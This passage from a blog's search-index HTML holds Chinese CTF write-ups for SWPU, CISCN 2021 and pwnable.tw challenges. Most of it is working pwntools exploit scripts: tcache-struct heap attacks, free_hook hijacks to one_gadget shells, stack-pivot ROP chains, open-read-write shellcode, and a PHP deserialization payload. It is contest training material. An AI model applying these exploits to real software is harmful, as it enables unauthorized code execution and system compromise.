shell=leak_addr+one_gadget[1]

delete(0)
# delete(1)
# delete(0)

edit(0,p64(malloc_hook-0x23))
# add(b&amp;quot;a&amp;quot;)
add(b&amp;quot;a&amp;quot;)
add(cyclic(0xb)+p64(shell)+p64(realloc+0x10))


io.sendlineafter(b&amp;quot;choice\n&amp;quot;,b&amp;quot;1&amp;quot;)


io.interactive()

# 0x45226 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;misc&#34;&gt;MISC：&lt;/h3&gt;
&lt;h4 id=&#34;embarrass&#34;&gt;embarrass：&lt;/h4&gt;
&lt;p&gt;流量包strings 直接跑出来flag&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686458594979.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;basic-type&#34;&gt;Basic type&lt;/h4&gt;
&lt;p&gt;直接用随波逐流工具直接一把梭哈，可以得到flag图片&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466842481.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;run&#34;&gt;run&lt;/h4&gt;
&lt;p&gt;打开附件发现是word，然后进行foremost分离出来这些图片&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466850238.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;把exe那个拖进ida,发现有一串密文&lt;/p&gt;
&lt;p&gt;然后出现一个图片，图片发现是两个图层，然后发现有一个解密逻辑&lt;/p&gt;
&lt;p&gt;然后写一个脚本即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;str = &#39;njCp1HJBPLVTxcMhUHDPwE7mPW&#39;
flag = &#39;&#39;
for i in range(1, len(str)+1):
    if i % 2 == 0:
        flag += chr(ord(str[i-1]) + 1)
    else:
        flag += chr(ord(str[i-1]) - 1)
print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;web&#34;&gt;web&lt;/h3&gt;
&lt;h4 id=&#34;missing_php&#34;&gt;missing_php&lt;/h4&gt;
&lt;p&gt;这题上扫描  扫出/.index.php.swp这个目录&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466863431.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;然后直接访问  /fl4444444g就出flag了&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466869831.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h4 id=&#34;序列化&#34;&gt;序列化&lt;/h4&gt;
&lt;p&gt;源码里面有一个这个&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466879636.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;然后用BP抓包发现cookie里面有两个值,把list进行urldecode发现传入的参数都被当做数组序列化了&lt;/p&gt;
&lt;p&gt;然后根据这个构造一个POC脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
$a=[];
Class whatthefuck{
    public $source;
    public function __construct()
    {
        $this-&amp;gt;source = &amp;quot;flag.php&amp;quot;;
    }
	public function __toString()
	{
		return highlight_file($this-&amp;gt;source,true);
	}
}
$a[0]=new whatthefuck;
echo serialize($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后跑出payload(a:1:{i:0;O:11:&amp;quot;whatthefuck&amp;quot;:1:{s:6:&amp;quot;source&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;}})进行一次urlencode编码,改cookie的list值即可&lt;/p&gt;
&lt;h2 id=&#34;reverse&#34;&gt;Reverse&lt;/h2&gt;
&lt;h3 id=&#34;easycrack&#34;&gt;easyCrack&lt;/h3&gt;
&lt;p&gt;将exe文件脱机脱壳机，一键脱壳&lt;/p&gt;
&lt;p&gt;然后将脱好的exe脱机ida里面，然后找到主函数发现加密逻辑&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466895944.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;然后在str2找到密文&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1686466904748.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;然后写一个脚本就ok了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;ans=&amp;quot;hboiuFk|kGocs&amp;quot;
flag=&amp;quot;&amp;quot;
for i in range(12,-1,-1):
    s=ord(ans[i])
    s^=14
    flag+=chr(s)
print(flag[::-1])
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;crpyto&#34;&gt;Crpyto&lt;/h3&gt;
&lt;h4 id=&#34;xor&#34;&gt;xor&lt;/h4&gt;
&lt;p&gt;进行一次base64解码，然后进行亦或爆破直接出flag了&lt;/p&gt;
">天津市大学生信息安全网络攻防大赛【CTF解题赛】 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/jHcQ-mMeR/"" data-c="
          &lt;p&gt;过去的SWPU的题目搬出来做一下&lt;/p&gt;
&lt;h4 id=&#34;tnote&#34;&gt;tnote:&lt;/h4&gt;
&lt;p&gt;off by one堆重叠泄露堆地址&lt;br&gt;
然后劫持到tcache struct（heap_base+0x10处修改counts泄露libc然后正常打free_hook&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28240)
# io=process(&amp;quot;./service&amp;quot;)
elf=ELF(&amp;quot;./service&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;A&amp;quot;)
    io.sendlineafter(b&amp;quot;size?&amp;quot;,str(s))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;E&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;content:&amp;quot;,cc)
    
def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;S&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;D&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?&amp;quot;,str(n))

# gdb.attach(io)
# pause()

add(0x18) #0
add(0x18) #1
add(0x78) #2
add(0x10) #3

edit(0,cyclic(0x18)+p64(0x61))
delete(1)   
delete(2)
# edit(0,cyclic(0x18)+p64(0x81))
add(0x50) #1 #下标复用，按照delete顺序复用
edit(1,b&amp;quot;a&amp;quot;*0x27+b&amp;quot;b&amp;quot;)
show(1)
io.recvuntil(b&amp;quot;b&amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x10 #泄露堆地址
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

edit(1,b&amp;quot;a&amp;quot;*0x18+p64(0x81)+p64(heap_addr+0x10)+p64(0))
add(0x78) #2
add(0x78) #4
edit(4,b&amp;quot;\x07&amp;quot;*0x40+p64(0)*6+p64(heap_addr+0x10))
delete(4)
add(0x78) #4
show(4)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;] #泄露libc地址
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
one_gadget=[0x4f3d5,0x4f432,0x10a41c]
shell=leak_addr+one_gadget[1]

edit(4,b&amp;quot;\x02&amp;quot;*0x40+p64(0)*3+p64(free_hook))
add(0x40) #5  
edit(5,p64(shell)) #劫持free_hook打one_gadget

delete(5) #trigger

io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;p1kkheap&#34;&gt;p1KkHeap:&lt;/h4&gt;
&lt;p&gt;开启沙盒禁用&lt;code&gt;execve()&lt;/code&gt;&lt;br&gt;
mmap开辟rwx段&lt;br&gt;
劫持hook到rwx段上地址打orw shellcode即可&lt;br&gt;
同样需要打tcache struct，注意构造tcachebin的大小&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node1.anna.nssctf.cn&amp;quot;,28176)
# io=process(&amp;quot;./SWPUCTF_2019_p1KkHeap&amp;quot;)
elf=ELF(&amp;quot;./SWPUCTF_2019_p1KkHeap&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size: &amp;quot;,str(s))

def show(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    io.sendafter(b&amp;quot;content: &amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;Choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;id: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

mm_addr=0x66660100

add(0x100) #0
add(0x100) #1
delete(0)
delete(0)
show(0)
io.recvuntil(b&amp;quot;content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

add(0x100) #2
edit(2,p64(heap_addr+0x10)) 
add(0x100) #3
add(0x100) #4
edit(4,b&amp;quot;\x07&amp;quot;*0x40)
delete(0)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
orw_shellcode=asm(shellcraft.open(&amp;quot;/flag&amp;quot;)+shellcraft.read(3,mm_addr+0x400,0x50)+shellcraft.write(1,mm_addr+0x400,0x50))

edit(4,b&amp;quot;\x07&amp;quot;*0x40+p64(0)*6+p64(malloc_hook)+p64(0)+p64(mm_addr))
add(0x90) #5
edit(5,orw_shellcode)
add(0x70) #6
edit(6,p64(mm_addr))

add(0x30)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;wheretogo&#34;&gt;WheretoGo：&lt;/h4&gt;
&lt;p&gt;一次溢出的栈迁移模板题，不过因为环境问题最后得迁2次&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28972)
# io=process(&amp;quot;./WheretoGo&amp;quot;)
elf=ELF(&amp;quot;./WheretoGo&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
bk_addr=0x4011bd
bss_addr=0x404d00
read_text=0x4011C9
leave_ret=0x4011e0
pop_rdi=0x4012d3

io.recvuntil(b&amp;quot;go?\n&amp;quot;)
payload=cyclic(0x80)+p64(bss_addr)+p64(read_text)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

payload=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(bk_addr)
payload=payload.ljust(0x80,b&amp;quot;\x00&amp;quot;)+p64(bss_addr-0x80)+p64(leave_ret)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))


payload=cyclic(0x80)+p64(bss_addr-0x200-0x8)+p64(read_text)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)

# gdb.attach(io)
# pause()

payload=p64(0)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x80,b&amp;quot;\x00&amp;quot;)+p64(bss_addr-0x280-0x8)+p64(leave_ret)
payload=payload.ljust(0x100,b&amp;quot;a&amp;quot;)
io.send(payload)


# payload=cyclic(0x88)+p64(pop_rdi)+p64(str_bin_sh)+p64(sys_addr)
# io.send(payload)


io.interactive()

# Gadgets information
# ============================================================
# 0x00000000004011e0 : leave ; ret
# 0x00000000004012cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012ce : pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012d0 : pop r14 ; pop r15 ; ret
# 0x00000000004012d2 : pop r15 ; ret
# 0x00000000004012cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x00000000004012cf : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x00000000004012d3 : pop rdi ; ret
# 0x00000000004012d1 : pop rsi ; pop r15 ; ret
# 0x00000000004012cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">SWPU 部分wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/qmbh8mgFo/"" data-c="
          &lt;h4 id=&#34;silverwolf&#34;&gt;&lt;strong&gt;silverwolf:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;glibc 2.27-3ubuntu1.4，&lt;code&gt;堆上orw&lt;/code&gt;+&lt;code&gt;tcache struct attack&lt;/code&gt;&lt;br&gt;
本题实际上只能控制index为0的堆块，且每次创建堆块最大不超过0x78，存在UAF，开启沙盒保护，只有打orw&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1686106761807.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
可以通过&lt;code&gt;tcache double free&lt;/code&gt;泄露堆地址，此版本加入检测，可以通过覆盖&lt;code&gt;tcache bk&lt;/code&gt;为0绕过&lt;br&gt;
泄露libc基址可以打&lt;code&gt;tcache struct&lt;/code&gt;，控制堆块到&lt;code&gt;heap_base+0x10&lt;/code&gt;处修改&lt;code&gt;tcachebin counts&lt;/code&gt;为不小于7的数，后续再次释放时进入&lt;code&gt;unsortedbin&lt;/code&gt;泄露地址&lt;br&gt;
之后修改&lt;code&gt;tcache struct&lt;/code&gt;结构，劫持&lt;code&gt;free_hook&lt;/code&gt;到&lt;code&gt;setcontext+53&lt;/code&gt;处，后续&lt;code&gt;delete&lt;/code&gt;时调用&lt;code&gt;free_hook&lt;/code&gt;指令跳转到&lt;code&gt;setcontext+53&lt;/code&gt;处,此处指令为&lt;code&gt;mov  rsp, [rdi+0A0h]&lt;/code&gt;,会将rsp的值覆盖为&lt;code&gt;[rdi+0xa0]&lt;/code&gt;的值，而此处正是我们将要布置的&lt;code&gt;p64(heap_addr+0x4000)+p64(ret)&lt;/code&gt;，将要劫持rsp到我们要写入orw rop链的地方&lt;br&gt;
构造orw rop链，此题open需要使用syscall&lt;s&gt;防止破坏栈结构&lt;/s&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(read_addr)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(write_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本题由于堆块大小限制，无法一次性将orw的rop链写入堆块，于是分两次写入，注意控制写入堆块之间的距离为单次写入长度&lt;br&gt;
另外注意syscall的偏移，用ROPgadget找到的打不通，用ropper找能打通&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28802)
io=process(&amp;quot;./silverwolf&amp;quot;)
elf=ELF(&amp;quot;./silverwolf&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def edit(cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,b&amp;quot;0&amp;quot;)
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))

def rst():
    for i in range(12):
        add(0x10)
    for i in range(11):
        add(0x60)
    for i in range(7):
        add(0x70)
    add(0x50)
    

rst()  #开启seccomp后堆风水乱掉，尽可能恢复
add(0x78)
delete(0)
edit(p64(0)*2) #绕过tcache double free检测
delete(0)
show(0)  #泄露堆地址，为后续堆上rop做准备
io.recvuntil(b&amp;quot;Content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x1920
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))
edit(p64(heap_addr+0x10))
add(0x78)  
add(0x78)  #申请到heap_addr+0x10处修改counts
edit(p64(0)*0x4+p64(0x7000000)+p64(0)*3) #tcache struct attack

delete(0)
show(0)  #泄露libc
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
setcontext=libc.sym[b&amp;quot;setcontext&amp;quot;]+leak_addr+53 #mov rsp,[rdi+0A0h]
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+leak_addr
open_addr=libc.sym[b&amp;quot;open&amp;quot;]+leak_addr
read_addr=libc.sym[b&amp;quot;read&amp;quot;]+leak_addr
write_addr=libc.sym[b&amp;quot;write&amp;quot;]+leak_addr
flag_addr=heap_addr+0x1000

#gadgets
pop_rdi=0x215bf+leak_addr
pop_rsi=0x23eea+leak_addr
pop_rdx=0x01b96+leak_addr
pop_rcx=0x34da3+leak_addr
pop_rax=0x43ae8+leak_addr 
pop_rsp=0x03960+leak_addr
syscall=0xd2745+leak_addr 
ret=0x08aa+leak_addr

# edit((p64(0)+p64(1))*4)


payload=b&amp;quot;\x02&amp;quot;*0x40+p64(free_hook) #对应tcachebin 大小 0x18
payload+=p64(0) #0x28
payload+=p64(heap_addr+0x1000) #flag   0x38 flag字符串地址
payload+=p64(heap_addr+0x2000) #stack   0x48  最后delete触发free_hook的tcachebin
payload+=p64(heap_addr+0x20a0) #stack   0x58 写入迁移到orw rop的tcachebin处
payload+=p64(heap_addr+0x4000) #orw rop  0x68 
payload+=p64(heap_addr+0x4068) #orw rop  0x78
edit(payload)


#open
orw=p64(pop_rdi)+p64(flag_addr)+p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(read_addr)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(heap_addr+0x5000)+p64(pop_rdx)+p64(0x50)+p64(write_addr)


gdb.attach(io)
pause()


add(0x18)
edit(p64(setcontext)) #将free_hook指向setcontext+0x53处，避开fldenv指令

add(0x38)
edit(b&amp;quot;./flag&amp;quot;)

add(0x68)
edit(orw[:0x68])

add(0x78)
edit(orw[0x68:])

add(0x58)
edit(p64(heap_addr+0x4000)+p64(ret))

add(0x48)
delete(0)

# add(0x58)
# add(0x48)
# delete(n)
# payload+=
# add(0x40)
# for i in range(4):
#     add(0x10)
# edit(b&amp;quot;flag\x00\x00\x00&amp;quot;)

# edit(p64(0)*8)
# edit(p64(free_hook))
# add(0x10)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h4 id=&#34;lonelywolf&#34;&gt;&lt;strong&gt;lonelywolf:&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;上一题的弱化版，没有seccomp，tcachebin和fastbin结构正常&lt;br&gt;
绕过检测double free后泄露堆地址打&lt;code&gt;tcachebin struct&lt;/code&gt;泄露libc地址&lt;br&gt;
之后修改&lt;code&gt;tcache struct&lt;/code&gt;后劫持&lt;code&gt;free_hook&lt;/code&gt;打&lt;code&gt;one_gadget&lt;/code&gt;即可&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28287)
# io=process(&amp;quot;./lonelywolf&amp;quot;)
elf=ELF(&amp;quot;./lonelywolf&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,s):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    
def edit(n,cc):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def delete(n):
    io.sendlineafter(b&amp;quot;choice: &amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

add(0,0x78)
delete(0)
edit(0,p64(0)*2)
delete(0)
show(0)

io.recvuntil(b&amp;quot;Content: &amp;quot;)
heap_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))-0x260
print(&amp;quot;heap_addr: &amp;quot;+hex(heap_addr))

edit(0,p64(heap_addr+0x10))
add(0,0x78)
add(0,0x78)
edit(0,b&amp;quot;\x07&amp;quot;*0x40)

delete(0)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x70-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
one_gadget=[0x4f3d5,0x4f432,0x10a41c]
shell=one_gadget[2]+leak_addr

payload=b&amp;quot;\x02&amp;quot;*0x40+p64(free_hook)

edit(0,payload)

add(0,0x10)
edit(0,p64(shell))

delete(0)

io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">CISCN_2021_silverwolf&lonelywolf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/6uuDjG65H/"" data-c="
          &lt;p&gt;exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./seethefile&amp;quot;)
io=remote(&amp;quot;chall.pwnable.tw&amp;quot;,10200)
libc=ELF(&amp;quot;./libc_32.so.6&amp;quot;)

def openn(cc):
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;see :&amp;quot;,cc)


def readd():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;2&amp;quot;)
    
def writee():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;3&amp;quot;)
    
def closes():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;4&amp;quot;)

def of():
    io.sendlineafter(b&amp;quot;Your choice :&amp;quot;,b&amp;quot;5&amp;quot;)


openn(&#39;/proc/self/maps&#39;)
readd()
writee()
# readd()
# writee()


io.recvuntil(b&amp;quot;heap]\n&amp;quot;)

leak_addr=int(io.recv(8),16)+0x1000
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

payload=cyclic(0x20)
payload+=p32(0x804B284)
payload+=p32(0xffffdfff)
payload+=b&amp;quot;;/bin/sh&amp;quot;+b&amp;quot;\x00&amp;quot;*0x88  #结构体大小0x94
payload+=p32(0x804B284+0x98)
payload+=p32(sys_addr)*3

of()
io.recvuntil(b&amp;quot;name :&amp;quot;)
io.sendline(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">pwnable_seethefile</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/glFiyd5Mk/"" data-c="
